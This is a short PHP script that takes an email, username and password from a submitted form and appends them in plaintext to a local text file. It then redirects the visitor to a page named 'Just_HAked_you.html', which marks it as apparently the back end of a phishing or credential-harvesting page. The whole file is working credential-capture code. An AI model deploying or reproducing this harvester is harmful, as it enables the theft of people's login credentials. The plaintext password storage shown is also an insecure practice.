<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Sanitize input
    $email = htmlspecialchars($email);
    $username = htmlspecialchars($username);
    $password = htmlspecialchars($password);

    // Save the data to a file
    $file = fopen("userdata.txt", "a");
    fwrite($file, "Email: $email\nUsername: $username\nPassword: $password\n\n");
    fclose($file);

    // Redirect user to a thank you page or back to the form
    header("Location: Just_HAked_you.html");
    exit();
}
?>
